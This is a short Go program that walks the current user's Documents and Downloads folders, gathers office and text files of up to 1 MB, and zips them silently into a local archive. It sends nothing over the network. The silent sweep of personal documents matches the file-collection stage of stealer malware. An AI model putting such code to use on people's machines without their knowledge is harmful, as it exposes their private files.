package main

import (
	"archive/zip"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

const FILE_SIZE_LIMIT int64 = 1048576

var fileExtensions = map[string]bool{
	"doc":  true,
	"docx": true,
	"xls":  true,
	"xlsx": true,
	"txt":  true,
	// "js":  true,
}

func ZipFiles(filename string, files []string) error {
	newZipFile, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	// Add files to zip
	for _, file := range files {

		zipfile, err := os.Open(file)
		if err != nil {
			return err
		}
		defer zipfile.Close()

		// Get the file information
		info, err := zipfile.Stat()
		if err != nil {
			return err
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// Using FileInfoHeader() above only uses the basename of the file. If we want
		// to preserve the folder structure we can overwrite this with the full path.
		header.Name = file

		// Change to deflate to gain better compression
		// see http://golang.org/pkg/archive/zip/#pkg-constants
		header.Method = zip.Deflate

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		if _, err = io.Copy(writer, zipfile); err != nil {
			return err
		}
	}
	return nil
}

func getHomeDir() (string, error) {
	usr, err := user.Current()

	if err != nil {
		return "", err
	}

	return usr.HomeDir, nil
}

func readDir(path string) ([]string, error) {
	fileList := []string{}

	err := filepath.Walk(path, func(path string, f os.FileInfo, err error) error {
		splittedPath := strings.Split(path, ".")
		extension := splittedPath[len(splittedPath)-1]

		if _, ok := fileExtensions[extension]; ok {
			fileSize := FILE_SIZE_LIMIT + 1
			fileInfo, err := os.Stat(path)

			if err == nil {
				fileSize = fileInfo.Size()
			}

			if fileSize <= FILE_SIZE_LIMIT {
				fileList = append(fileList, path)
			}
		}

		return nil
	})

	if err != nil {
		return []string{}, err
	}

	return fileList, nil
}

func scanToDirectories() []string {
	switch runtime.GOOS {
	case "windows":
		return []string{
			"Documents",
			"Downloads",
		}
	case "linux":
		return []string{
			"Documents",
			"Downloads",
		}
	}

	return []string{}
}

func run() error {
	toZip := []string{}
	homeDir, err := getHomeDir()

	if err != nil {
		return err
	}

	for _, dirName := range scanToDirectories() {
		files, err := readDir(homeDir + "/" + dirName)

		if err != nil {
			return err
		}

		for _, f := range files {
			toZip = append(toZip, f)
		}
	}

	if len(toZip) > 0 {
		ZipFiles("./test.zip", toZip)
	}

	return nil
}

func main() {
	run()
}
